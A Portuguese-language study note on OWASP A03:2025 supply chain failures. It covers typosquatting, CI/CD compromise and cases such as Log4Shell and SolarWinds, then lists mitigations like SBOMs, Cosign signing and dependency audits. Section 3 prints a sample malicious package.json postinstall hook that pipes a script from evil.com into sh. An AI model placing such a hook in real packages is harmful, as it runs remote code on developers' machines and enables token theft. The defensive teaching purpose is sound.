---
type: conhecimento
status: active
tags: [segurança, owasp, supply-chain, dependências, cicd, 2025]
created: 2026-05-20
---

# 🔗 OWASP A03:2025 — Software Supply Chain Failures

> Falhas na cadeia de suprimentos de software. Uma das maiores ameaças de 2025-2026: atacantes comprometem dependências, pipelines CI/CD e registros de pacotes antes do código chegar à produção.

---

## Por Que Subiu ao Top 3

Com proteção perimetral cada vez mais forte, grupos adversários realocaram ataques para **repositórios públicos, ambientes CI/CD e provedores de dependências**, infectando soluções através de "trust cascades" (cadeias de confiança) antes do código alcançar infraestrutura final.

**Impacto catalogado pela OWASP:** maior magnitude de ramificação sistêmica de toda a lista.

---

## Vetores de Ataque

### 1. Dependências Vulneráveis e Obsoletas (CWE-447, CWE-477, CWE-1035, CWE-1395)

Frameworks desatualizados herdam vulnerabilidades latentes com os **mesmos privilégios do sistema**.

**Casos reais:**
- **Log4Shell** (CVE-2021-44228) — RCE em Log4j2, afetou 90% do mundo Java/Kotlin
- **Struts2 RCE** (CVE-2017-5638) — explorado na violação da Equifax (147M registros)
- Ambos capitalizaram esquecimento corporativo de atualizações em sub-packages

### 2. Dependências Falsificadas / Typosquatting

Pacotes maliciosos disfarçados de legítimos:
- `requests` vs `request` no npm
- `urllib` vs `urlib` no PyPI
- Nomes de organizações (ex: pacote com escopo de empresa inexistente)

### 3. Scripts Post-Install Maliciosos (CWE-1104, CWE-1329)

```json
// package.json malicioso
{
  "scripts": {
    "postinstall": "curl https://evil.com/steal.sh | sh"
  }
}
```

**Caso real — npm worm 2025 (Shai-Hulud):**
- Malware injetado como script post-install em bibliotecas conhecidas
- Extraía tokens NPM válidos do desenvolvedor
- Propagava-se iterativamente por dependentes da biblioteca

### 4. Comprometimento de Pipeline CI/CD

Atacante injeta código malicioso no ambiente de build:
- Variáveis de ambiente com credenciais
- Segredos de cloud (AWS keys, GCP service accounts)
- Acesso ao registry de imagens

**Caso real — SolarWinds (2019):**
- APT comprometeu o sistema de build da SolarWinds
- Binários maliciosos distribuídos para 18.000+ clientes via update legítimo
- Ficou oculto por 9 meses

### 5. Ataques a Carteiras e Signing Keys

**Caso real — Bybit (2025):**
- Exploração no momento de decodificação de carteira
- US$ 1,5 bilhão furtados
- Atacou a dependência de interface da carteira, não o protocolo em si

---

## CWEs Associados

| CWE | Descrição |
|-----|-----------|
| CWE-447 | Presence of Undocumented Features |
| CWE-477 | Use of Obsolete Function |
| CWE-1035 | OWASP Top Ten 2017 A9 — Using Components with Known Vulnerabilities |
| CWE-1104 | Use of Unmaintained Third Party Components |
| CWE-1329 | Reliance on Component That is Not Updatable |
| CWE-1357 | Reliance on Insufficiently Trustworthy Component |

---

## Mitigações

### 1. Software Bill of Materials (SBOM)
Inventário completo de todas as dependências do software:

```bash
# Gerar SBOM com CycloneDX
pip install cyclonedx-bom
cyclonedx-py -r --format json -o sbom.json

# npm
npx @cyclonedx/cyclonedx-npm --output-format JSON --output-file sbom.json
```

### 2. Assinatura Digital de Artefatos (Sigstore/Cosign)

```bash
# Assinar imagem Docker
cosign sign --key cosign.key myimage:sha256-abc123

# Verificar no deploy
cosign verify --key cosign.pub myimage:sha256-abc123
```

### 3. Fixar Versões com Hash no CI/CD

```bash
# ✅ Hash determinístico
pip install requests==2.31.0 --hash=sha256:58cd2187423839...

# ❌ Evitar ranges imprecisos
pip install requests>=2.0
```

### 4. Auditoria Automática de Dependências

```bash
# npm
npm audit
npm audit fix

# Python
pip-audit

# CI/CD gate
npm audit --audit-level=high && echo "OK" || exit 1
```

### 5. Isolamento de CI/CD

```yaml
# GitHub Actions — principle of least privilege
permissions:
  contents: read       # Nunca write desnecessário
  packages: write      # Apenas o que o job precisa
```

### 6. Verificar Integridade antes de Instalar

```bash
# Verificar checksum antes de executar script externo
curl -fsSL https://example.com/install.sh | sha256sum --check expected.sha256
```

### 7. Monitorar Novos Mantenedores

Ferramentas como **Socket.dev** e **OpenSSF Scorecard** detectam:
- Mudança recente de mantenedor (sinal de account takeover)
- Dependências com scripts suspeitos
- Pacotes abandonados com vulnerabilidades

---

## Checklist para Projetos

```
✓ SBOM gerado e atualizado em cada release
✓ Dependências fixadas com versão exata (lock files commitados)
✓ `npm audit` / `pip-audit` no pipeline CI como gate de bloqueio
✓ Imagens assinadas com Cosign
✓ Permissões de CI mínimas (principle of least privilege)
✓ Dependências críticas auditadas manualmente (não apenas automático)
✓ Política de update regular (Dependabot / Renovate configurado)
✓ Monitorar CVEs nas dependências (Snyk, GitHub Dependabot Alerts)
```

---

## Referências
- owasp.org/Top10/A03_2025
- [[gitops-deployment|GitOps — pipeline seguro →]]
- [[owasp-top10-2025|OWASP Top 10 2025 — visão geral →]]
